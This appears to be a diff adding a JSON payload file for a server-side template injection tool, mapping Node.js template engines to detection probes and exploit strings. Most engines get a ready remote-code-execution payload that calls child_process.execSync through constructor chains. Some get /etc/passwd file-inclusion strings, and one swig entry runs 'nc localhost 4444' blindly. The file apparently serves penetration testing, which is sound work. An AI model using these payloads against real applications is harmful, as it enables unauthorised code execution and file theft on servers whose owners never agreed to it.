@@ -1,0 +1,242 @@
+{
+  "ejs": {
+    "payloads": {
+      "<%=7*7%>" :"49",
+      "<%=typeof global.process%>" : "object"
+    },
+    "exploit": {
+      "rce": "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+    }
+  },
+  "underscore": {
+    "payloads": {
+      "<%=7*7%>" :"49",
+      "<%print('yes')%>" : "yes",
+      "<%=typeof global.process%>" : "object"
+    },
+    "exploit":
+    {
+      "RCE": "<%=global.process.mainModule.require(\"child_process\").execSync(\"id\")%>"
+    }
+  },
+  "mustache_js": {
+    "payloads": {
+      "{{^missing}}yes{{/missing}}" : "yes",
+      "{{constructor.name}}" : "Object"
+    },
+    "exploit": "None"
+  },
+  "handlebars": {
+    "payloads": {
+      "{{^missing}}yes{{/missing}}": "yes",
+      "{{#if false}}foo{{else}}yes{{/if}}" : "yes"
+    },
+    "exploit": "None"
+  },
+  "nunjucks": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "{{range(1, 4)}}" : "1,2,3",
+      "{{constructor.name}}" : "Object"
+    },
+    "exploit":
+    {
+      "RCE": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+      "RCE2": "{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"
+
+    }
+  },
+  "twig_js": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "{{range(1, 4)}}" : "1,2,3,4",
+      "{{attribute(1, '__proto__')}}": "0"
+    },
+    "exploit":
+    {
+      "RCE": "{%set F=attribute(attribute(\"A\", \"constructor\"),\"constructor\")%}{%set get_process=F(\"return process\")%}{{ get_process().mainModule.require(\"child_process\").execSync(\"id\").toString()}}"
+    }
+  },
+  "liquidjs": {
+    "payloads": {
+      "{{7|times:7}}" : "49"
+    },
+    "exploit":
+    {
+      "LFI": "{% include '/etc/passwd' %}"
+    }
+  },
+  "pug": {
+    "payloads": {
+      "= typeof global.process" : "object",
+      "#{7*7}" : "<49></49>"
+    },
+    "exploit":
+    {
+      "RCE": "=''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
+    }
+
+
+  },
+  "art-template": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "<%=7*7%>" : "49",
+      "{{'a'*7}}" : "null",
+      "{{if true}}yes{{/if}}" : "yes",
+      "<%print('yes')%>" : "yes",
+      "{{constructor.name}}" : "Object",
+      "{{$options ? 'yes' : 'no'}}" : "no"
+    },
+    "exploit":
+    {
+      "RCE": "{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}"
+    }
+
+  },
+  "squirrelly": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "{{@if(true)}}yes{{/if}}" : "yes",
+      "{{constructor.name}}" : "Object"
+    },
+    "exploit":
+    {
+      "RCE": "{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"
+    }
+  },
+  "dot": {
+    "payloads": {
+      "{{= typeof global }}" : "object",
+      "{{= 7 * 7 }}" : "49"
+    },
+    "exploit":
+    {
+      "rce": "{{=''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}"
+    } 
+  },
+  "jsrender": {
+    "payloads": {
+      "{{if true}}yes{{/if}}" : "yes",
+      "{{:7*7}}" : "49"
+    },
+    "exploit":
+    {
+      "RCE": "{{:''.toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('id').toString()\")()}}"
+    }
+  },
+  "swig": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "{{= 7 * 7 }}" : "49",
+      "{{constructor.name}}" : "Object"
+    },
+    "exploit":
+    {
+      "LFI": "{%include '/etc/passwd'%}",
+      "blind rce": "{% include \"/etc/passwd\" + Object.constructor(\"return global.process.mainModule.require('child_process').execSync('nc localhost 4444')\")().toString() %}"
+    }
+  },
+  "marko": {
+    "payloads": {}
+  },
+  "velocityjs": {
+    "payloads": {
+      "#set($x = 7*7)$x" :"49",
+      "#if(true)yes#end" :"yes",
+      "${constructor.name}" :"Object"
+    },
+    "exploit":
+    {
+      "RCE": "#set($x = '')#set($f = $x.constructor.constructor)#set($code = 'return process')#set($fn = $f($code))#set($result = $fn().mainModule.require('child_process').execSync('id').toString())${result}"
+    }
+  },
+  "carbone": {
+    "payloads": {}
+  },
+
+  "ractive": {
+    "payloads": {
+      "{{7*7}}": "49",
+      "{{= 7 * 7 }}" : "49",
+      "{{constructor.name}}" : "Object",
+      "{{#if false}}foo{{else}}yes{{/if}}" : "yes",
+      "{{^missing}}yes{{/missing}}" : "yes",
+      "{{$options ? 'yes' : 'no'}}" : "no"
+    },
+    "exploit": {
+      "RCE" : "{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}"
+    }
+  },
+  "carbone": {
+    "payloads": {
+      "{{7*7}}": "49"
+    }
+  },
+  "liquidnode": {
+    "payloads": {
+      "{{7|times:7}}": "49",
+      "{{if true}}yes{{/if}}": "yes",
+      "{{@if(true)}}yes{{/if}}" : "yes",
+      "{{^missing}}yes{{/missing}}" : "yes"
+    },
+    "exploit": {
+    }
+  },
+  "eta": {
+    "payloads": {
+      "<%=7*7%>": "49",
+      "<%=typeof global.process%>" : "object"
+    },
+    "exploit": {
+      "RCE" : "<%=global.process.mainModule.require('child_process').execSync('id')%>"
+    }
+  },
+  "dustjs": {
+    "payloads": {
+      "{{constructor.name}}" : "{Object}",
+      "{{^missing}}yes{{/missing}}" : "{}yes{}",
+      "{#a}foo{:else}bar{/a}" :"bar",
+      "${constructor.name}": "$Object"
+    },
+    "exploit": {
+    }
+  },
+  "lodash": {
+    "payloads": {
+      "${constructor.name}" : "Object",
+      "<%=7*7%>" : "49",
+      "<%print('yes')%>" : "yes",
+      "<%=typeof global.process%>" : "object"
+    },
+    "exploit": {
+      "RCE" : "${''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}"
+    }
+  },
+  "hogan": {
+    "payloads": {
+      "{{^missing}}yes{{/missing}}" : "yes"
+    },
+    "exploit": {
+    }
+  },
+  "jazz": {
+    "payloads": {
+      "{49}" : "49",
+      "${constructor.name}": "$Object"
+    },
+    "exploit": {
+    }
+  },
+  "vue3": {
+    "payloads": {
+      "{{7*7}}" : "49",
+      "{{$options ? 'yes' : 'no'}}" : "yes"
+    },
+    "exploit": {
+      "RCE" : "{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}"
+    }
+  }
+
+
+}
